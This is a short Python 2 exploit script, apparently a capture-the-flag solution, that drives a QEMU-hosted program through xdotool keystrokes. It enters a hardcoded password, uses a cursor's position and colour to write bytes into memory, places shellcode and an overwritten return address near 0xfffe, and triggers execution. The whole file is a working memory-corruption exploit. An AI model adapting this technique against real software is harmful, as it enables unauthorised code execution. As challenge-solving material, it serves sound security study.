#!/usr/bin/python2

import time
import subprocess
import struct

WINDOW_TITLE = '^QEMU(.*VNC)?$'
WINDOW_ID = subprocess.check_output(['xdotool', 'search', '--limit', '1', '--name', WINDOW_TITLE]).strip()

# may need higher values for remote
DELAY_MAP_DRAW_S = 6
DELAY_KEYPRESS_MS = 12

scope_x = 160
scope_y = 100
scope_color = 0x0c

def activate_window():
	subprocess.check_call(['xdotool', 'windowactivate', WINDOW_ID])

def press(keys):
	subprocess.check_call(['xdotool', 'key', '--delay', str(DELAY_KEYPRESS_MS)] + list(keys))
	time.sleep(DELAY_KEYPRESS_MS / 1000.0)

def auth():
	press(['minus', 'J', 'O', 'S', 'H', 'U', 'A', 'minus'])

def select_blessed_base():
	press(['Return'])
	time.sleep(DELAY_MAP_DRAW_S)
	press(['Left', 'Left', 'Return'])

def move_scope_x(x):
	global scope_x
	if x < scope_x:
		press(['Left'] * (scope_x - x))
	elif x > scope_x:
		press(['Right'] * (x - scope_x))
	scope_x = x

def move_scope_y(y):
	global scope_y
	if y < scope_y:
		press(['Up'] * (scope_y - y))
	elif y > scope_y:
		press(['Down'] * (y - scope_y))
	scope_y = y

def set_scope_color(color):
	global scope_color
	if color < scope_color:
		press(['a'] * (scope_color - color))
	elif color > scope_color:
		press(['q'] * (color - scope_color))
	scope_color = color

def write_byte(addr, val):
	assert(0xfec0 <= addr <= 0xffff)
	set_scope_color(val)
	move_scope_x(addr - 0xfec0)
	move_scope_y(0)
	move_scope_y(1)

def trigger_trail(retaddr_addr):
	assert(0 <= retaddr_addr <= 0xffff and retaddr_addr & 0xff == 0xfe)
	set_scope_color(retaddr_addr >> 8)
	move_scope_x(60)
	move_scope_y(0)
	press(['Return'])

activate_window()
auth()
select_blessed_base()

RETADDR_ADDR = 0xfffe
SHELLCODE = '\xc7\x06\x14\x7c\x64\x16\xe9\xf7\x7b'
PAYLOAD_ADDR = RETADDR_ADDR - len(SHELLCODE)
PAYLOAD = SHELLCODE + struct.pack('<H', PAYLOAD_ADDR)

for i in range(len(PAYLOAD)):
	write_byte(PAYLOAD_ADDR + i, ord(PAYLOAD[i]))

trigger_trail(RETADDR_ADDR)
